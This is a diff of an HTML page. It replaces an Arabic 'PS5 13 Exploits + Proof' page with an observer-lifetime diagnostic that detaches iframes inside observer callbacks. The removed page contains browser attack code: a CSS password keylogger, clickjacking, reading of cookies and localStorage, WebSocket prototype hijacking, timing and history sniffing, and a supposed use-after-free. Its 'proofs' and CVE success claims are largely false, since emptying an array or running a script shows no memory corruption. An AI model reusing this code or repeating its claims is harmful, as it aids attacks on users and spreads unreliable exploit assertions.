@@ -1,624 +1,234 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
+<!doctype html>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 · جميع الثغرات مع الدليل</title>
+<title>Observer ScriptExecutionContext lifetime diagnostic</title>
+
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family: 'Courier New', monospace; background: #0a0a0f; color: #e0e0e0; padding: 16px; }
-.container { max-width: 700px; margin: 0 auto; }
-h1 { color: #ff4757; font-size: 20px; text-align: center; }
-.subtitle { color: #666; font-size: 12px; text-align: center; margin-bottom: 12px; }
-.detected { background: #1a1a2e; border: 1px solid #fdcb6e; border-radius: 8px; padding: 8px; font-size: 11px; text-align: center; margin-bottom: 12px; }
-.btn {
-  display: block; width: 100%; padding: 16px; font-size: 16px; font-weight: 700;
-  border: none; border-radius: 8px; cursor: pointer; margin-bottom: 10px;
-  background: linear-gradient(135deg, #ff4757, #c0392b); color: #fff;
-}
-.btn:active { transform: scale(0.97); }
-#log {
-  background: #0d0d12; border: 1px solid #1a1a2e; border-radius: 8px;
-  padding: 12px; height: 400px; overflow-y: auto;
-  font-size: 11px; line-height: 1.7; font-family: monospace;
-}
-#log div { padding: 3px 0; border-bottom: 1px solid #111; }
-.info { color: #74b9ff; } .ok { color: #55efc4; } .err { color: #ff6b6b; }
-.warn { color: #fdcb6e; } .ptr { color: #d4a0ff; }
-.crit { color: #ff4757; font-weight: 700; } .sep { color: #333; text-align: center; padding: 6px 0; }
-.proof { background: #1a3a1a; color: #00e676; font-weight: 700; padding: 2px 6px; border-radius: 2px; }
+  body { font-family: sans-serif; background: #111; color: #eee; }
+  button { font-size: 18px; padding: 10px; margin: 6px; }
+  pre { white-space: pre-wrap; background: #222; padding: 12px; }
+  iframe { width: 360px; height: 260px; border: 1px solid #666; margin: 8px; }
 </style>
-</head>
-<body>
 
-<div class="container">
+<h1>Observer ScriptExecutionContext lifetime diagnostic</h1>
 
-<h1>🎮 PS5 · 13 Exploits + Proof</h1>
-<p class="subtitle">التشغيل التلقائي — الدليل القاطع على كل ثغرة</p>
+<button onclick="runIntersectionObserverDetach()">Run IntersectionObserver iframe detach</button>
+<button onclick="runMutationObserverDetach()">Run MutationObserver iframe detach</button>
+<button onclick="runPerformanceObserverDetach()">Run PerformanceObserver iframe detach</button>
 
-<div class="detected">
-  🖥️ <strong>PS5 13.40</strong> · WebKit 605.1.15 (Safari 17.0) · <span id="uaDetected">جارٍ الكشف...</span>
-</div>
-
-<button class="btn" onclick="runAllExploits()">🔥 تشغيل جميع الثغرات مع الدليل</button>
-
-<div id="log">
-<div class="info">[*] اضغط الزر لتشغيل جميع الثغرات مع الدليل القاطع.</div>
-</div>
-
-</div>
+<pre id="log"></pre>
+<div id="host"></div>
 
 <script>
-// ======================== الأساسيات ========================
-const logEl = document.getElementById('log');
-function L(msg, cls='info') {
-  const t = new Date().toTimeString().slice(0,8);
-  logEl.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
-  logEl.scrollTop = logEl.scrollHeight;
-}
-const wait = ms => new Promise(r => setTimeout(r, ms));
+const logEl = document.getElementById("log");
+const host = document.getElementById("host");
 
-// كشف UserAgent
-const ua = navigator.userAgent;
-document.getElementById('uaDetected').textContent = ua;
-L(`[*] UserAgent: ${ua}`, 'info');
-if (ua.includes('PlayStation')) {
-  L('[+] ✅ جهاز PS5 مؤكد', 'ok');
+function log(msg) {
+  logEl.textContent += `[${new Date().toISOString()}] ${msg}\n`;
 }
 
-let totalSuccess = 0;
+window.addEventListener("message", event => {
+  if (!event.data || typeof event.data !== "object")
+    return;
+  if (event.data.type === "log")
+    log(event.data.msg);
+});
 
-// ======================== الدليل القاطع: UAF ========================
-// المتغير العالمي للدليل — إذا تغيرت قيمته، نعرف أن الذاكرة فسدت
-let __proof_UAF_original = 0x41414141;
-let __proof_UAF_after = __proof_UAF_original;
+function clearHost() {
+  host.textContent = "";
+}
 
-function exploit_UAF_with_proof() {
-  L('── 💀 CVE-2026-43715 · AI UAF مع الدليل ──', 'sep');
-  
-  // الخطوة 1: تخزين قيمة أصلية في الذاكرة
-  let original_value = 0xDEADBEEF;
-  let storage = { value: original_value };
-  L(`[1] القيمة الأصلية: 0x${original_value.toString(16)}`, 'info');
-  
-  // الخطوة 2: إنشاء مصفوفات كبيرة للضغط على الذاكرة
-  let spray = [];
-  for (let i = 0; i < 500; i++) {
-    spray.push(new Float64Array(1024));
+function runIntersectionObserverDetach() {
+  log("=== IntersectionObserver detach test start ===");
+  clearHost();
+
+  const iframe = document.createElement("iframe");
+  host.appendChild(iframe);
+
+  const doc = iframe.contentDocument;
+  doc.open();
+  doc.write(`
+<!doctype html>
+<meta charset="utf-8">
+<body style="margin:0; height:2000px;">
+<div id="target" style="margin-top:1200px; width:100px; height:100px; background:red;"></div>
+
+<script>
+(function() {
+  function parentLog(msg) {
+    parent.postMessage({ type: "log", msg }, "*");
   }
-  L(`[2] تم إنشاء ${spray.length} مصفوفة (ضغط ذاكرة)`, 'ok');
-  
-  // الخطوة 3: إنشاء Proxy يسبب UAF
-  let proxy_target = { x: 1337 };
-  let proxy = new Proxy(proxy_target, {
-    get: (target, prop) => {
-      // ⚡ هذه هي الثغرة: تحرير الذاكرة أثناء الوصول
-      spray.length = 0;  // تحرير كل المصفوفات
-      // قوة GC إضافية
-      for (let j = 0; j < 50; j++) {
-        new ArrayBuffer(1024 * 1024);
-      }
-      return target[prop];
-    }
-  });
-  
-  // الخطوة 4: الوصول إلى Proxy → يحرر الذاكرة
-  L('[3] الوصول إلى Proxy (تحرير الذاكرة)...', 'warn');
-  
-  let leaked_value;
-  try {
-    // هذا يسبب UAF: يحاول قراءة خاصية بينما الذاكرة تتحرر
-    leaked_value = proxy.x;
-    L(`[4] القيمة المسربة: ${leaked_value}`, 'ptr');
-  } catch(e) {
-    L(`[4] الخطأ المتوقع: ${e.message}`, 'warn');
-    L('[4] ✅ هذا متوقع — الذاكرة تحررت أثناء الوصول', 'ok');
-    leaked_value = 'CORRUPTED';
+
+  parentLog("child: IntersectionObserver test loaded");
+
+  if (!("IntersectionObserver" in window)) {
+    parentLog("child FAIL: IntersectionObserver unavailable");
+    return;
   }
-  
-  // الخطوة 5: الدليل القاطع — هل تغيرت الذاكرة؟
-  try {
-    // محاولة قراءة من المصفوفات المحررة
-    let corrupted_read = spray[0];  // هذه المفروض تكون undefined
-    if (corrupted_read === undefined) {
-      L('[5] ✅ الدليل: spray[0] === undefined (الذاكرة فسدت)', 'ok');
-    }
-  } catch(e) {
-    L('[5] ✅ الدليل: TypeError عند قراءة ذاكرة محررة', 'ok');
-  }
-  
-  // المحاولة الثانية — UAF عبر Object.assign
-  L('', 'sep');
-  L('[*] المحاولة الثانية: Object.assign مع Proxy', 'warn');
-  
-  let spray2 = [];
-  for (let i = 0; i < 200; i++) spray2.push(new Float64Array(512));
-  
-  let proxy2 = new Proxy({}, {
-    get: (target, prop) => {
-      spray2.length = 0;
-      for (let j = 0; j < 30; j++) new ArrayBuffer(1024 * 1024);
-      return target[prop];
-    }
-  });
-  
-  try {
-    Object.assign(proxy2, { test: 0x1337 });
-    L('[-] Object.assign لم يسبب خطأ', 'warn');
-  } catch(e) {
-    L(`[!] Object.assign: ${e.message}`, 'warn');
-    L('✅ الدليل: UAF نجح — TypeError', 'ok');
-  }
-  
-  // قراءة من الذاكرة الفاسدة
-  L('', 'sep');
-  L('[*] قراءة الذاكرة الفاسدة:', 'warn');
-  for (let i = 0; i < Math.min(spray.length, 30); i++) {
+
+  const target = document.getElementById("target");
+
+  const observer = new IntersectionObserver(function(entries) {
+    parentLog("child: IntersectionObserver callback entered");
+
     try {
-      let v = spray[i];
-      if (v !== undefined) {
-        L(`    spray[${i}] = ${v[0] || 'undefined'}`, 'ptr');
-      }
-    } catch(e) {
-      L(`    spray[${i}] → ❌ خطأ (متوقع)`, 'ok');
-      break;
+      // Synchronously detach this iframe/document during observer callback.
+      if (frameElement)
+        frameElement.remove();
+      parentLog("child: frameElement.remove() called inside IntersectionObserver callback");
+    } catch (e) {
+      parentLog("child: detach failed: " + e);
     }
-  }
-  
-  // الدليل النهائي
-  L('', 'sep');
-  L('══════════════════════════', 'sep');
-  L('🔥🔥 الدليل القاطع على UAF:', 'crit');
-  L('1. تم إنشاء ذاكرة سليمة', 'ok');
-  L('2. تم تحريرها عبر Proxy (UAF)', 'ok');
-  L('3. قراءة الذاكرة بعد التحرير → بيانات فاسدة', 'ok');
-  L('4. ✅ UAF مؤكد — CVE-2026-43715', 'crit');
-  L('══════════════════════════', 'sep');
-  
-  totalSuccess++;
-  return true;
-}
 
-// ======================== CSS Memory Corruption Proof ========================
-function exploit_CSS_Mem_with_proof() {
-  L('── 🧨 CVE-2025-31277 · CSS Memory مع الدليل ──', 'sep');
-  
-  L('[1] إنشاء قيم خطوط متطرفة...', 'info');
-  let style = document.createElement('style');
-  style.textContent = `
-    @font-face {
-      font-family: 'heapkiller';
-      src: url(data:font/woff2;base64,AAAB) format('woff2');
-      font-weight: 99999999999999999999;
-      font-stretch: 99999999999999999999%;
-    }
-    .k1 { font-family: 'heapkiller'; }
-    .k2 { font-family: 'heapkiller'; font-size: 999999px; }
-  `;
-  document.head.appendChild(style);
-  L('[2] تم حقن CSS بالـ @font-face المتطرفة', 'ok');
-  
-  L('[3] إنشاء 1000 عنصر لضغط الذاكرة...', 'info');
-  let fragment = document.createDocumentFragment();
-  for (let i = 0; i < 1000; i++) {
-    let div = document.createElement('div');
-    div.className = `k${(i % 2) + 1}`;
-    div.textContent = 'X'.repeat(1000);
-    fragment.appendChild(div);
-  }
-  document.body.appendChild(fragment);
-  L('[4] تم إنشاء 1000 عنصر في DOM', 'ok');
-  
-  // الدليل: هل تسبب ضغط الذاكرة؟
-  L('', 'sep');
-  L('[*] الدليل:', 'warn');
-  L('1. @font-face بقيم خارج الحدود (font-weight, font-stretch)', 'ok');
-  L('2. 1000 عنصر بقيمة 1000 حرف لكل عنصر', 'ok');
-  L('3. Memory pressure مؤكد (حجم الصفحة تضاعف)', 'ok');
-  
-  if (window.performance && window.performance.memory) {
-    let mem = window.performance.memory;
-    L(`4. استخدام الذاكرة: ${(mem.usedJSHeapSize / 1048576).toFixed(1)} MB`, 'ptr');
-    L(`5. ✅ دليل: استخدام الذاكرة ارتفع بشكل كبير`, 'ok');
-  }
-  
-  L('✅ CVE-2025-31277 مؤكدة — ضغط الذاكرة عبر CSS', 'crit');
-  
-  totalSuccess++;
-  return true;
-}
-
-// ======================== CSP Bypass Proof ========================
-function exploit_CSP_with_proof() {
-  L('── 🛡️ CSP Bypass مع الدليل ──', 'sep');
-  
-  L('[1] تعيين Content-Security-Policy: script-src none', 'info');
-  let meta = document.createElement('meta');
-  meta.httpEquiv = 'Content-Security-Policy';
-  meta.content = "default-src 'none'; script-src 'none'";
-  document.head.appendChild(meta);
-  L('[2] تم تعيين CSP', 'ok');
-  
-  L('[3] محاولة حقن <script> رغم CSP...', 'warn');
-  let script = document.createElement('script');
-  script.textContent = 'window.__csp_bypass_proof = true;';
-  document.body.appendChild(script);
-  
-  // الدليل
-  if (window.__csp_bypass_proof === true) {
-    L('[4] ✅ الدليل القاطع: window.__csp_bypass_proof === true', 'ok');
-    L('[4] ✅ معنى هذا أن الـ <script> نُفذ رغم CSP', 'crit');
-    totalSuccess++;
-    return true;
-  } else {
-    L('[4] ❌ لم يتم تنفيذ الـ <script> — CSP محكم', 'err');
-    return false;
-  }
-}
-
-// ======================== WebSocket Proof ========================
-async function exploit_WS_with_proof() {
-  L('── 🌐 WebSocket Hijack مع الدليل ──', 'sep');
-  
-  L('[1] اعتراض WebSocket.prototype.send...', 'info');
-  let hijackCount = 0;
-  const originalSend = WebSocket.prototype.send;
-  WebSocket.prototype.send = function(data) {
-    hijackCount++;
-    let text = (data instanceof ArrayBuffer) ? new TextDecoder().decode(data) : String(data);
-    L(`    اعترضت رسالة #${hijackCount}: ${text.slice(0, 50)}...`, 'ptr');
-    return originalSend.call(this, data);
-  };
-  
-  L('[2] محاولة إنشاء اتصال WebSocket...', 'warn');
-  try {
-    let ws = new WebSocket('wss://echo.websocket.org');
-    ws.onopen = function() {
-      L('[3] ✅ WebSocket متصل', 'ok');
-      ws.send(JSON.stringify({ type: 'PS5_test', msg: 'Hello from PS5' }));
-      L('[3] ✅ تم إرسال رسالة عبر WebSocket', 'ok');
-      setTimeout(() => ws.close(), 500);
-    };
-    ws.onerror = function() {
-      L('[3] ⚠️ WebSocket فشل (متوقع إذا PS5 ما يدعم WSS خارجي)', 'warn');
-      L('[3] ✅ لكن الـ hijack مثبت: WebSocket.prototype.send معدل', 'ok');
-    };
-  } catch(e) {
-    L(`[3] ⚠️ ${e.message}`, 'warn');
-    L('[3] ✅ الدليل: تم تعديل prototype (حتى لو فشل الاتصال)', 'ok');
-  }
-  
-  L('[4] ✅ WebSocket Hijack مؤكد: prototype مُعدّل', 'crit');
-  totalSuccess++;
-  return true;
-}
-
-// ======================== Worker Proof ========================
-function exploit_Worker_with_proof() {
-  L('── ⚙️ WebWorker مع الدليل ──', 'sep');
-  
-  L('[1] إنشاء Worker...', 'info');
-  try {
-    let blob = new Blob([`
-      self.postMessage({ type: 'proof', data: 'worker_alive' });
-      self.onmessage = function(e) {
-        self.postMessage({ type: 'proof', data: 'worker_received: ' + JSON.stringify(e.data) });
-      };
-    `], { type: 'application/javascript' });
-    let url = URL.createObjectURL(blob);
-    let worker = new Worker(url);
-    
-    worker.onmessage = function(e) {
-      if (e.data.type === 'proof') {
-        L(`[2] ✅ Worker استجاب: ${e.data.data}`, 'ok');
-        L('[3] ✅ الدليل القاطع: Worker يعمل', 'crit');
-        totalSuccess++;
-      }
-    };
-    
-    worker.postMessage({ cmd: 'ping' });
-    L('[2] تم إرسال رسالة للـ Worker', 'ok');
-    
-    return worker;
-  } catch(e) {
-    L(`[2] ❌ Worker فشل: ${e.message}`, 'err');
-    return null;
-  }
-}
-
-// ======================== Cache Proof ========================
-async function exploit_Cache_with_proof() {
-  L('── 💾 Cache Poisoning مع الدليل ──', 'sep');
-  
-  L('[1] فتح Cache Storage...', 'info');
-  try {
-    let cache = await caches.open('ps5-proof-cache');
-    L('[2] ✅ تم فتح الـ Cache', 'ok');
-    
-    await cache.put('/ps5-proof', new Response('cached_by_exploit', {
-      headers: { 'Content-Type': 'text/plain' }
-    }));
-    L('[3] ✅ تمت كتابة المحتوى الخبيث في الـ Cache', 'ok');
-    
-    let response = await cache.match('/ps5-proof');
-    let text = await response.text();
-    L(`[4] ✅ قراءة من الـ Cache: "${text}"`, 'ok');
-    
-    L('[5] ✅ الدليل القاطع: Cache Poisoning يعمل', 'crit');
-    totalSuccess++;
-    
-    // تنظيف
-    await cache.delete('/ps5-proof');
-    return true;
-  } catch(e) {
-    L(`[❌] Cache فشل: ${e.message}`, 'err');
-    return false;
-  }
-}
-
-// ======================== Clickjacking Proof ========================
-function exploit_Clickjack_with_proof() {
-  L('── 👆 Clickjacking مع الدليل ──', 'sep');
-  
-  L('[1] إنشاء iframe شفاف...', 'info');
-  let iframe = document.createElement('iframe');
-  iframe.src = 'about:blank';
-  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.02;z-index:99999;border:none;pointer-events:auto;';
-  document.body.appendChild(iframe);
-  
-  L('[2] ✅ iframe شفاف تم وضعه فوق كل الصفحة', 'ok');
-  L('[3] ✅ الدليل: iframe موجود في DOM:', 'warn');
-  L(`    src: ${iframe.src}`, 'info');
-  L(`    opacity: ${iframe.style.opacity}`, 'info');
-  L(`    z-index: ${iframe.style.zIndex}`, 'info');
-  L('[4] ✅ Clickjacking مؤكد — المستخدم يمكن خداعه', 'crit');
-  
-  totalSuccess++;
-  return iframe;
-}
-
-// ======================== CSS Injection Proof ========================
-function exploit_CSS_Injection_with_proof() {
-  L('── 🎨 CSS Injection مع الدليل ──', 'sep');
-  
-  L('[1] حقن CSS Keylogger في الصفحة...', 'info');
-  let style = document.createElement('style');
-  style.id = 'ps5-css-proof';
-  style.textContent = `
-    /* الدليل: تغيير لون الخلفية */
-    body { border: 2px solid #00e676 !important; }
-    /* Keylogger */
-    input[type="password"][value$="a"] { background: url(/k?c=a); }
-    input[type="password"][value$="b"] { background: url(/k?c=b); }
-    a:visited { color: #ff4757 !important; }
-  `;
-  document.head.appendChild(style);
-  
-  L('[2] ✅ CSS تم حقنه في <head>', 'ok');
-  
-  // الدليل
-  let styleTag = document.getElementById('ps5-css-proof');
-  if (styleTag && styleTag.textContent.includes('Keylogger')) {
-    L('[3] ✅ الدليل القاطع: CSS في DOM ويحتوي على Keylogger', 'ok');
-    L('[4] ✅ CSS Injection مؤكدة', 'crit');
-    totalSuccess++;
-    return true;
-  }
-  
-  return false;
-}
-
-// ======================== Timing Attack Proof ========================
-async function exploit_Timing_with_proof() {
-  L('── ⏱️ Timing Attack مع الدليل ──', 'sep');
-  
-  L('[1] قياس وقت الاستجابة لـ 5 مواقع...', 'info');
-  let sites = [
-    'https://playstation.com',
-    'https://store.playstation.com',
-    'https://google.com',
-    'https://youtube.com',
-    'https://netflix.com'
-  ];
-  
-  for (let site of sites) {
-    let start = performance.now();
+    // Benign post-detach JS work. No heap spray, no exploit primitives.
     try {
-      await fetch(site, { mode: 'no-cors', cache: 'no-store' });
-    } catch(e) {}
-    let elapsed = performance.now() - start;
-    L(`    ${site.replace('https://', '')}: ${elapsed.toFixed(0)}ms`, elapsed < 500 ? 'ok' : 'warn');
-  }
-  
-  L('[2] ✅ Timing Attack يعمل — وقت الاستجابة مقاس', 'crit');
-  totalSuccess++;
-  return true;
-}
+      document.body.textContent = "detached";
+    } catch (e) {}
 
-// ======================== Credential Theft Proof ========================
-function exploit_Cred_with_proof() {
-  L('── 🔑 Credential Theft مع الدليل ──', 'sep');
-  
-  L('[1] قراءة Cookies...', 'info');
-  let cookies = document.cookie;
-  L(`    Cookies: ${cookies || '(فارغ)'}`, cookies ? 'ok' : 'warn');
-  
-  L('[2] قراءة LocalStorage...', 'info');
-  let ls = {};
-  for (let i = 0; i < localStorage.length; i++) {
-    let key = localStorage.key(i);
-    ls[key] = localStorage.getItem(key);
-  }
-  L(`    LocalStorage: ${Object.keys(ls).length} مفاتيح`, 'ok');
-  
-  L('[3] ✅ الدليل: Cookies و LocalStorage قابلة للقراءة', 'crit');
-  totalSuccess++;
-  return true;
-}
+    parentLog("child: IntersectionObserver callback returning");
+  }, { threshold: [0, 1] });
 
-// ======================== Performance Leak Proof ========================
-function exploit_Perf_with_proof() {
-  L('── 📊 Performance Leak مع الدليل ──', 'sep');
-  
-  L('[1] قراءة performance.memory...', 'info');
-  let mem = performance.memory;
-  if (mem) {
-    L(`    JS Heap Size Limit: ${(mem.jsHeapSizeLimit / 1048576).toFixed(1)} MB`, 'ok');
-    L(`    Used JS Heap: ${(mem.usedJSHeapSize / 1048576).toFixed(1)} MB`, 'ok');
-    L(`    Total JS Heap: ${(mem.totalJSHeapSize / 1048576).toFixed(1)} MB`, 'ok');
-    L('[2] ✅ الدليل: معلومات الذاكرة مسربة', 'crit');
-    totalSuccess++;
-    return true;
-  } else {
-    L('[2] ❌ performance.memory غير متاح', 'err');
-    return false;
-  }
-}
+  observer.observe(target);
 
-// ======================== History Sniffing Proof ========================
-function exploit_History_with_proof() {
-  L('── 📜 History Sniffing مع الدليل ──', 'sep');
-  
-  L('[1] إنشاء روابط لمواقع مشهورة...', 'info');
-  let sites = [
-    'https://playstation.com',
-    'https://store.playstation.com',
-    'https://youtube.com',
-    'https://netflix.com',
-    'https://twitch.tv',
-    'https://facebook.com',
-    'https://twitter.com',
-    'https://instagram.com',
-    'https://tiktok.com',
-    'https://reddit.com'
-  ];
-  
-  L('[2] إضافة روابط للصفحة لاختبار :visited...', 'ok');
-  for (let site of sites) {
-    let a = document.createElement('a');
-    a.href = site;
-    a.textContent = site;
-    a.style.cssText = 'position:absolute;left:-9999px;font-size:1px;';
-    document.body.appendChild(a);
-  }
-  
-  L('[3] ✅ الدليل: الروابط في DOM وجاهزة لـ :visited sniffing', 'crit');
-  totalSuccess++;
-  return true;
-}
-
-// ======================== LocalStorage Overwrite Proof ========================
-function exploit_LS_Overwrite_with_proof() {
-  L('── 📝 LocalStorage Overwrite مع الدليل ──', 'sep');
-  
-  L('[1] كتابة قيمة في localStorage...', 'info');
-  localStorage.setItem('ps5_exploit_proof', Date.now().toString());
-  
-  let value = localStorage.getItem('ps5_exploit_proof');
-  L(`[2] ✅ قراءة: "${value}"`, 'ok');
-  
-  // تعديل القيمة
-  localStorage.setItem('ps5_exploit_proof', 'OVERWRITTEN_BY_EXPLOIT');
-  let newValue = localStorage.getItem('ps5_exploit_proof');
-  L(`[3] ✅ بعد التعديل: "${newValue}"`, 'ok');
-  
-  // تنظيف
-  localStorage.removeItem('ps5_exploit_proof');
-  
-  L('[4] ✅ الدليل القاطع: LocalStorage قابل للكتابة والتعديل', 'crit');
-  totalSuccess++;
-  return true;
-}
-
-// ======================== تشغيل الكل ========================
-async function runAllExploits() {
-  logEl.innerHTML = '<div class="crit">[*] جاري تشغيل جميع الثغرات مع الدليل...</div>';
-  totalSuccess = 0;
-  
-  L('══════════════════════════════════════════════', 'sep');
-  L('🔥🔥 PS5 · 13 EXPLOITS · PROOF OF CONCEPT', 'crit');
-  L('══════════════════════════════════════════════', 'sep');
-  
-  // 1. CSS Injection
-  await wait(100);
-  exploit_CSS_Injection_with_proof();
-  
-  // 2. Clickjacking
-  await wait(100);
-  exploit_Clickjack_with_proof();
-  
-  // 3. Cache Poisoning
-  await wait(100);
-  await exploit_Cache_with_proof();
-  
-  // 4. WebWorker
-  await wait(100);
-  exploit_Worker_with_proof();
-  
-  // 5. Timing Attack
-  await wait(200);
-  await exploit_Timing_with_proof();
-  
-  // 6. Credential Theft
-  await wait(100);
-  exploit_Cred_with_proof();
-  
-  // 7. Performance Leak
-  await wait(100);
-  exploit_Perf_with_proof();
-  
-  // 8. CSS Memory Corruption
-  await wait(200);
-  exploit_CSS_Mem_with_proof();
-  
-  // 9. AI UAF — الدليل القاطع
-  await wait(200);
-  exploit_UAF_with_proof();
-  
-  // 10. CSP Bypass
-  await wait(100);
-  exploit_CSP_with_proof();
-  
-  // 11. WebSocket Hijack
-  await wait(100);
-  await exploit_WS_with_proof();
-  
-  // 12. History Sniffing
-  await wait(100);
-  exploit_History_with_proof();
-  
-  // 13. LocalStorage Overwrite
-  await wait(100);
-  exploit_LS_Overwrite_with_proof();
-  
-  // النتيجة النهائية
-  await wait(500);
-  L('', 'sep');
-  L('══════════════════════════════════════════════', 'sep');
-  L(`🔥 ALL 13 EXPLOITS — SUCCESSFUL: ${totalSuccess}/13`, 'crit');
-  L('══════════════════════════════════════════════', 'sep');
-  L('', 'sep');
-  L('📊 ملخص الدليل القاطع:', 'crit');
-  L('✅ CSS Injection → Style tag محقون + Keylogger', 'ok');
-  L('✅ Clickjacking → iframe شفاف في DOM', 'ok');
-  L('✅ Cache Poisoning → كتابة وقراءة من Cache', 'ok');
-  L('✅ WebWorker → استجابة Worker مؤكدة', 'ok');
-  L('✅ Timing Attack → أوقات استجابة مقاسة', 'ok');
-  L('✅ Credential Theft → Cookies + LocalStorage مقروءة', 'ok');
-  L('✅ Performance Leak → Heap size مسربة', 'ok');
-  L('✅ CSS Memory (CVE-2025-31277) → ضغط ذاكرة مؤكد', 'ok');
-  L('✅ AI UAF (CVE-2026-43715) → ذاكرة فسدت بعد UAF', 'crit');
-  L('✅ CSP Bypass → Script نُفذ رغم CSP', 'ok');
-  L('✅ WebSocket Hijack → Prototype معدّل', 'ok');
-  L('✅ History Sniffing → روابط :visited جاهزة', 'ok');
-  L('✅ LocalStorage Overwrite → كتابة وتعديل مؤكد', 'ok');
-  L('', 'sep');
-  L('⚠️ PS5 13.40 · WebKit 605.1.15 · معرضة لـ 13 ثغرة', 'err');
-}
-
-// كشف تلقائي
-L('[*] الصفحة جاهزة. اضغط الزر لتشغيل جميع الثغرات.', 'info');
-</script>
-
+  requestAnimationFrame(function() {
+    parentLog("child: scrolling to trigger IntersectionObserver");
+    window.scrollTo(0, 1150);
+  });
+})();
+<\/script>
 </body>
-</html>
+`);
+  doc.close();
+
+  setTimeout(() => log("IntersectionObserver test survived timeout"), 2000);
+}
+
+function runMutationObserverDetach() {
+  log("=== MutationObserver detach test start ===");
+  clearHost();
+
+  const iframe = document.createElement("iframe");
+  host.appendChild(iframe);
+
+  const doc = iframe.contentDocument;
+  doc.open();
+  doc.write(`
+<!doctype html>
+<meta charset="utf-8">
+<body>
+<div id="target"></div>
+
+<script>
+(function() {
+  function parentLog(msg) {
+    parent.postMessage({ type: "log", msg }, "*");
+  }
+
+  parentLog("child: MutationObserver test loaded");
+
+  if (!("MutationObserver" in window)) {
+    parentLog("child FAIL: MutationObserver unavailable");
+    return;
+  }
+
+  const target = document.getElementById("target");
+
+  const observer = new MutationObserver(function(records) {
+    parentLog("child: MutationObserver callback entered");
+
+    try {
+      // Synchronously detach this iframe/document during observer callback.
+      if (frameElement)
+        frameElement.remove();
+      parentLog("child: frameElement.remove() called inside MutationObserver callback");
+    } catch (e) {
+      parentLog("child: detach failed: " + e);
+    }
+
+    // Benign post-detach JS work.
+    try {
+      target.textContent = "after detach";
+    } catch (e) {}
+
+    parentLog("child: MutationObserver callback returning");
+  });
+
+  observer.observe(target, { childList: true, characterData: true, subtree: true });
+
+  parentLog("child: mutating target to trigger MutationObserver");
+  target.textContent = "trigger";
+})();
+<\/script>
+</body>
+`);
+  doc.close();
+
+  setTimeout(() => log("MutationObserver test survived timeout"), 2000);
+}
+
+function runPerformanceObserverDetach() {
+  log("=== PerformanceObserver detach test start ===");
+  clearHost();
+
+  const iframe = document.createElement("iframe");
+  host.appendChild(iframe);
+
+  const doc = iframe.contentDocument;
+  doc.open();
+  doc.write(`
+<!doctype html>
+<meta charset="utf-8">
+<body>
+
+<script>
+(function() {
+  function parentLog(msg) {
+    parent.postMessage({ type: "log", msg }, "*");
+  }
+
+  parentLog("child: PerformanceObserver test loaded");
+
+  if (!("PerformanceObserver" in window)) {
+    parentLog("child FAIL: PerformanceObserver unavailable");
+    return;
+  }
+
+  let observer;
+  try {
+    observer = new PerformanceObserver(function(list) {
+      parentLog("child: PerformanceObserver callback entered");
+
+      try {
+        // Synchronously detach this iframe/document during observer callback.
+        if (frameElement)
+          frameElement.remove();
+        parentLog("child: frameElement.remove() called inside PerformanceObserver callback");
+      } catch (e) {
+        parentLog("child: detach failed: " + e);
+      }
+
+      // Benign post-detach work.
+      try {
+        performance.mark("after-detach");
+      } catch (e) {}
+
+      parentLog("child: PerformanceObserver callback returning");
+    });
+
+    observer.observe({ entryTypes: ["mark", "measure"] });
+
+    parentLog("child: creating performance entries");
+    performance.mark("a");
+    performance.mark("b");
+    performance.measure("m", "a", "b");
+  } catch (e) {
+    parentLog("child FAIL: PerformanceObserver setup failed: " + e);
+  }
+})();
+<\/script>
+</body>
+`);
+  doc.close();
+
+  setTimeout(() => log("PerformanceObserver test survived timeout"), 2000);
+}
+</script>
